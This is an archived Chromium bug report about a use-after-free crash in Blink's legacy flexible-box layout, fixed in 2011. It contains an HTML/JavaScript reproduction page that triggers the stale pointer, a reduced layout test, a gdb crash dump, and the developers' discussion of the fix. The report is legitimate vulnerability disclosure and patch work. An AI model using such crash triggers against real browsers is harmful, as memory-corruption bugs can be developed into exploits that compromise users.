# Stale pointer due to floats not removed (flexible box display)

| Field | Value |
|-------|-------|
| **Issue ID** | [40092547](https://issues.chromium.org/issues/40092547) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-07-11 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Under certain circumstances, chromium will crash due to a stale pointer in WebCore::RenderBlock::marginBeforeForChild. This seems very similar to <https://crbug.com/chromium/82546>.

**VERSION**  

Chrome Version: Chromium 12.0.742.112 Ubuntu 11.04, Google Chrome 14.0.803.0 dev  

Operating System: Ubuntu 11.04 64-bit

**REPRODUCTION CASE**

<script type="text/javascript">
function boom() {
setTimeout("document.getElementById('div').appendChild(document.getElementById('blockquote'));", 0);
setTimeout("t = document.getElementById('div'); t.parentNode.removeChild(t);", 24);
setTimeout('window.location.reload();', 100);
}
window.onload = boom;
</script>
<div style="display: -webkit-box;">
<div id="div">
<span style="float: right;">iwqapbqaglwbksrzvwltykdlwmlqteulnlrpfmqiasljdqiutiqukahravtbflaagbradguoey</span>
<span>a</span>
</div>
<span><ol><blockquote id="blockquote">-772523749</blockquote></ol></span>
</div>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

$ chromium-browser --debug --single-process crash.html  

(gdb) run

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffd1474700 (LWP 23753)]  

0x00007ffff64fb093 in WebCore::RenderBlock::marginBeforeForChild (  

this=<value optimized out>, child=0x7ffff8c568b8)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:6103  

6103 third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp: No such file or directory.  

in third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp  

(gdb) bt  

#0 0x00007ffff64fb093 in WebCore::RenderBlock::marginBeforeForChild (  

this=<value optimized out>, child=0x7ffff8c568b8)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:6103  

#1 0x00007ffff64fc613 in yPositionForFloatIncludingMargin (  

this=0x7ffff8c56ce8, paintInfo=..., tx=8, ty=8, preservePhase=false)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.h:487  

#2 WebCore::RenderBlock::paintFloats (this=0x7ffff8c56ce8, paintInfo=...,  

tx=8, ty=8, preservePhase=false)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2564  

#3 0x00007ffff6505c60 in WebCore::RenderBlock::paintObject (  

this=0x7ffff8c56ce8, paintInfo=..., tx=8, ty=8)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2498  

#4 0x00007ffff64ede4c in WebCore::RenderBlock::paint (this=0x7ffff8c56ce8,  

paintInfo=..., tx=8, ty=8)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2264  

#5 0x00007ffff64f258d in WebCore::RenderBlock::paintChildren (  

this=0x7ffff8c56748, paintInfo=..., tx=8, ty=8)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2417  

#6 0x00007ffff6505c32 in WebCore::RenderBlock::paintObject (  

this=0x7ffff8c56748, paintInfo=..., tx=8, ty=8)  

at third\_party/WebKit/Source/WebCore/rendering/RenderBlock.cpp:2484  

#7 0x00007ffff64ede4c in WebCore::RenderBlock::paint (this=0x7ffff8c56748,  

paintInfo=..., tx=8, ty=8)

(gdb) disas  

Dump of assembler code for function WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const:  

0x00007ffff64fb070 <+0>: mov 0x8(%rdi),%rax  

0x00007ffff64fb074 <+4>: movzbl 0x55(%rax),%eax  

0x00007ffff64fb078 <+8>: shr $0x4,%al  

0x00007ffff64fb07b <+11>: and $0x3,%eax  

0x00007ffff64fb07e <+14>: cmp $0x2,%eax  

0x00007ffff64fb081 <+17>: je 0x7ffff64fb0c0 <WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const+80>  

0x00007ffff64fb083 <+19>: cmp $0x3,%eax  

0x00007ffff64fb086 <+22>: je 0x7ffff64fb0b0 <WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const+64>  

0x00007ffff64fb088 <+24>: cmp $0x1,%eax  

0x00007ffff64fb08b <+27>: je 0x7ffff64fb0a0 <WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const+48>  

0x00007ffff64fb08d <+29>: mov (%rsi),%rax  

0x00007ffff64fb090 <+32>: mov %rsi,%rdi  

=> 0x00007ffff64fb093 <+35>: mov 0x518(%rax),%rax  

0x00007ffff64fb09a <+42>: jmpq \*%rax  

0x00007ffff64fb09c <+44>: nopl 0x0(%rax)  

0x00007ffff64fb0a0 <+48>: mov (%rsi),%rax  

0x00007ffff64fb0a3 <+51>: mov %rsi,%rdi  

0x00007ffff64fb0a6 <+54>: mov 0x530(%rax),%rax  

0x00007ffff64fb0ad <+61>: jmpq \*%rax  

0x00007ffff64fb0af <+63>: nop  

0x00007ffff64fb0b0 <+64>: mov (%rsi),%rax  

0x00007ffff64fb0b3 <+67>: mov %rsi,%rdi  

0x00007ffff64fb0b6 <+70>: mov 0x520(%rax),%rax  

0x00007ffff64fb0bd <+77>: jmpq \*%rax  

0x00007ffff64fb0bf <+79>: nop  

0x00007ffff64fb0c0 <+80>: mov (%rsi),%rax  

0x00007ffff64fb0c3 <+83>: mov %rsi,%rdi  

0x00007ffff64fb0c6 <+86>: mov 0x528(%rax),%rax  

0x00007ffff64fb0cd <+93>: jmpq \*%rax  

End of assembler dump.  

(gdb) i r  

rax 0x0 0  

rbx 0x7ffff8c56ce8 140737367076072  

rcx 0x8 8  

rdx 0x8 8  

rsi 0x7ffff8c568b8 140737367075000  

rdi 0x7ffff8c568b8 140737367075000  

rbp 0x7fffd14724d0 0x7fffd14724d0  

rsp 0x7fffd1472368 0x7fffd1472368  

r8 0x0 0  

r9 0x54 84  

r10 0x8 8  

r11 0x8 8  

r12 0x7ffff9141000 140737372229632  

r13 0x7ffff8fed710 140737370838800  

r14 0x0 0  

r15 0x8 8  

rip 0x7ffff64fb093 0x7ffff64fb093 <WebCore::RenderBlock::marginBeforeForChild(WebCore::RenderBoxModelObject\*) const+35>  

eflags 0x10297 [ CF PF AF SF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0  

(gdb) print \*child->m\_node  

$1 = {[WebCore::EventTarget](javascript:void(0);) = {  

\_vptr.EventTarget = 0x7ffff832ed30}, <WebCore::TreeShared[WebCore::ContainerNode](javascript:void(0);)> = {\_vptr.TreeShared = 0x7ffff832f278, m\_refCount = 0, m\_parent =  

0x7ffff918de80}, [WebCore::ScriptWrappable](javascript:void(0);) = {m\_wrapper = 0x0},  

m\_document = 0x7ffff8f4c400, m\_previous = 0x7ffff9180900,  

m\_next = 0x7ffff91807e0, m\_renderer = 0x0, m\_nodeFlags = 5767228}  

(gdb)

## Attachments

- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 12.8 KB)
- [crash.html](attachments/crash.html) (text/plain; charset=us-ascii, 612 B)

## Timeline

### in...@chromium.org (2011-07-11)

Good to have you back Marty. This looks like another flexible box display quirk.

Reduced testcase:: (affects both m12 and m14)
<html>
<body onload="runTest()">
<script>
    if (window.layoutTestController)
        layoutTestController.dumpAsText();

    function runTest()
    {
        document.body.offsetTop;
        var container = document.getElementById('container');
        var test = document.getElementById('test');
        test.appendChild(document.getElementById('blockquote'));
        document.body.offsetTop;
        test.parentNode.removeChild(test);
    }
</script>
<div id="container" style="display: -webkit-box;">
    <div id="test">
        <span style="float: right;">Test passes if it does not crash.</span>
        <span>.</span>
    </div>
    <span>
        <ol>
            <blockquote id="blockquote">PASS</blockquote>
        </ol>
    </span>
</div>
</body>
</html>

### in...@chromium.org (2011-07-12)

Flexible box is now deprecated, wish we could just get rid of this in Chromium. If you want to see the functional issue, just remove the line "test.parentNode.removeChild(test);" from above testcase and see the float getting drawn twice. (Test passes if it does not crash.)

Tony, i see you changed the class names to mark deprecation [http://trac.webkit.org/changeset/88952]. Any idea of the timelines when we will drop this functionality. Is it worth to fix the bug or just disable this in Chrome??

### oj...@chromium.org (2011-07-12)

I don't think we can realistically delete the old flex code. There are too many sites that already use it. We really should have called it legacy instead of deprecated. For the most part, we're not fixing correctness bugs in the old flex code, but security/crash bugs are an obvious exception.

### to...@chromium.org (2011-07-12)

Investigating...

### sc...@gmail.com (2011-07-12)

Thanks Tony!

### to...@chromium.org (2011-07-15)

https://bugs.webkit.org/show_bug.cgi?id=64603

### sc...@gmail.com (2011-07-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-07-20)

http://trac.webkit.org/changeset/91386

### to...@chromium.org (2011-07-20)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-07-25)

Merged to M13: http://trac.webkit.org/changeset/91684

### sc...@gmail.com (2011-07-25)

Rolled out and re-merged with function name change fix
http://trac.webkit.org/changeset/91691

### sc...@gmail.com (2011-07-25)

Ok, that is better. 100% less compile errors. Verified that test case no longer crashes on M13, post-merge, and did crash pre-merge.

### sc...@gmail.com (2011-07-26)

@MartyBarbella: thanks for another great report! As you might imagine, this qualifies for a provisional $1000 Chromium Security Reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-08-04)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed.. 

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/88889?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092547)*
